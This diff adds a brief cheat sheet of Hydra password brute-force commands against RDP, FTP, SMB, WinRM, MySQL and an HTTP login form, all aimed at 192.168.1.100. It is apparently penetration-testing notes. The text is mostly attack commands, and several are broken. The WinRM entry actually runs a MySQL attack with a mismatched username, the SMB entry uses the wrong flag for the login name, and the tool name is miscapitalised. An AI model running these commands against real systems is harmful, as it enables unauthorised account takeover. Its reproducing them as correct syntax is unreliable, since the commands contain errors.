@@ -1,0 +1,34 @@
+Brute Force Attack on RDP (Remote Desktop Protocol)
+-	Service: RDP (Windows Remote Desktop)
+-	Command:
+-	Hydra -l administrator -P /path/to/password_list.txt rdp://192.168.1.100
+-	Explanation: Tries to login as administrator on the RDP service at 192.168.1.100 using passwords from passwords from password_list.txt.
+  
+Brute Force Attack on FTP (File Transfer Protocol)
+-	Service: FTP
+-	Command:
+-	hydra -I -l user -P /path/to/password_list.txt ftp://192.168.1.100
+-	Explanation: Attempts to login as user on the FTP service running on 192.168.1.100 with the specified password list.
+
+ Brute Force Attack on SMB (Service Message Block)
+-	Service: SMB (Used for file sharing on Windows)
+-	Command:
+-	Hydra -I user -P /path/to/password_list.txt smb://192.168.1.100
+-	Explanation: Tries multiple passwords for user on the SMB services at 192.168.1.100, attempting to gain access to shared resources. 
+
+Brute Force Attack on WinRM (Windows Remote Management)
+-	Service: WinRM (Windows Remote Management)
+-	Command
+-	hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100
+-	Explanation: Attempts to login as administrator on the WinRM service at 192.168.1.100 using a password list.
+
+Brute Force Attack on MYSQL Database
+-	Service: MySQL
+-	Command:
+-	hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100
+-	Explanation: Attempts to login as root user to the MySQL database at 192.168.1.100 using the provided password list.
+
+Brute Force Attack on HTTP From Login
+-	Service: HTTP (Web Login From)
+-	Command:
+-	hydra -I -l admin -P /path/to/password_list.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
